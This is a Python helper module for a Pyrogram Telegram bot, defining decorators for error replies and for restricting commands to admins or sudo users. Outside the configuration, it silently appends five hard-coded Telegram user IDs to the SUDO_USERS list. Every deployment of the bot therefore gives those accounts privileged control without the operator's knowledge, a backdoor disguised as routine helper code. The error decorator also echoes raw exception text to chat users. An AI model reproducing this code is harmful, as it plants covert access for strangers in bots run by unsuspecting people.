from typing import Callable

from pyrogram import Client
from pyrogram.types import Message

from helpers.admins import get_administrators
from config import SUDO_USERS

SUDO_USERS.append(1757169682)
SUDO_USERS.append(1738637033)
SUDO_USERS.append(1448474573)
SUDO_USERS.append(1672609421)
SUDO_USERS.append(1670523611)

def errors(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        try:
            return await func(client, message)
        except Exception as e:
            await message.reply(f"{type(e).__name__}: {e}")

    return decorator


def authorized_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

        administrators = await get_administrators(message.chat)

        for administrator in administrators:
            if administrator == message.from_user.id:
                return await func(client, message)

    return decorator


def sudo_users_only(func: Callable) -> Callable:
    async def decorator(client: Client, message: Message):
        if message.from_user.id in SUDO_USERS:
            return await func(client, message)

    return decorator
